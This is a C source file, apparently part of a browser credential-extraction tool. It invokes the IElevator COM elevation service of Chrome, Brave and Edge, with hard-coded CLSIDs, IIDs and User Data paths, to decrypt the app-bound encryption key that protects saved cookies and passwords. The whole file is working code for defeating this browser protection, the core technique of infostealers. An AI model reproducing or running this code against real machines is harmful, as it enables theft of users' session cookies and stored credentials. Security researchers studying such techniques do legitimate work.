#include "elevator.h"
#include <oleauto.h>
#include <stdio.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

const BROWSER_CONFIG g_browsers[BROWSER_COUNT] = {
    [BROWSER_CHROME] = {
        .name           = L"Chrome",
        .user_data_path = L"Google\\Chrome\\User Data",
        .clsid          = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } },
        .iid_v1         = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } },
        .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
        .decrypt_vtable_idx = IELEVATOR_DECRYPT_IDX,
    },
    [BROWSER_BRAVE] = {
        .name           = L"Brave",
        .user_data_path = L"BraveSoftware\\Brave-Browser\\User Data",
        .clsid          = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } },
        .iid_v1         = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } },
        .iid_v2         = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } },
        .decrypt_vtable_idx = IELEVATOR_DECRYPT_IDX,
    },
    [BROWSER_EDGE] = {
        .name           = L"Edge",
        .user_data_path = L"Microsoft\\Edge\\User Data",
        .clsid          = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } },
        .iid_v1         = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } },
        .iid_v2         = { 0x8F7B6792, 0x784D, 0x4047, { 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 } },
        .decrypt_vtable_idx = IEDGE_ELEVATOR_DECRYPT_IDX,
    },
};

HRESULT elevator_decrypt_key(BROWSER_ID browser,
                             const BYTE* encrypted_key, DWORD encrypted_key_len,
                             BYTE** decrypted_key, DWORD* decrypted_key_len) {
    if (browser >= BROWSER_COUNT)
        return E_INVALIDARG;

    const BROWSER_CONFIG* cfg = &g_browsers[browser];
    IUnknown* elevator = NULL;
    HRESULT hr;

    // Try IElevator2 first, fall back to IElevator
    hr = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
                          &cfg->iid_v2, (void**)&elevator);
    if (FAILED(hr)) {
        HRESULT hr2 = CoCreateInstance(&cfg->clsid, NULL, CLSCTX_LOCAL_SERVER,
                                       &cfg->iid_v1, (void**)&elevator);
        if (FAILED(hr2))
            return (HRESULT)(ELEVATOR_STAGE_COCREATE | (hr2 & 0xFFFF));
    }

    // Set proxy blanket for proper authentication
    hr = CoSetProxyBlanket((IUnknown*)elevator,
        RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_DYNAMIC_CLOAKING);
    if (FAILED(hr)) {
        hr = (HRESULT)(ELEVATOR_STAGE_PROXY | (hr & 0xFFFF));
        goto cleanup;
    }

    // Wrap encrypted key as BSTR
    BSTR bstr_encrypted = SysAllocStringByteLen((const char*)encrypted_key, encrypted_key_len);
    if (!bstr_encrypted) {
        hr = E_OUTOFMEMORY;
        goto cleanup;
    }

    BSTR bstr_decrypted = NULL;
    DWORD com_error = 0;

    // Call DecryptData through the vtable
    PVOID* vtable = *(PVOID**)elevator;
    PFN_DecryptData pfn = (PFN_DecryptData)vtable[cfg->decrypt_vtable_idx];
    hr = pfn(elevator, bstr_encrypted, &bstr_decrypted, &com_error);

    SysFreeString(bstr_encrypted);

    if (FAILED(hr) || !bstr_decrypted) {
        if (SUCCEEDED(hr)) hr = E_FAIL;
        hr = (HRESULT)(ELEVATOR_STAGE_DECRYPT | (hr & 0xFFFF));
        goto cleanup;
    }

    // Extract raw bytes from returned BSTR
    DWORD dec_len = SysStringByteLen(bstr_decrypted);
    *decrypted_key = (BYTE*)malloc(dec_len);
    if (!*decrypted_key) {
        hr = E_OUTOFMEMORY;
        SysFreeString(bstr_decrypted);
        goto cleanup;
    }
    memcpy(*decrypted_key, (BYTE*)bstr_decrypted, dec_len);
    *decrypted_key_len = dec_len;
    SysFreeString(bstr_decrypted);

cleanup:
    if (elevator)
        elevator->lpVtbl->Release(elevator);
    return hr;
}
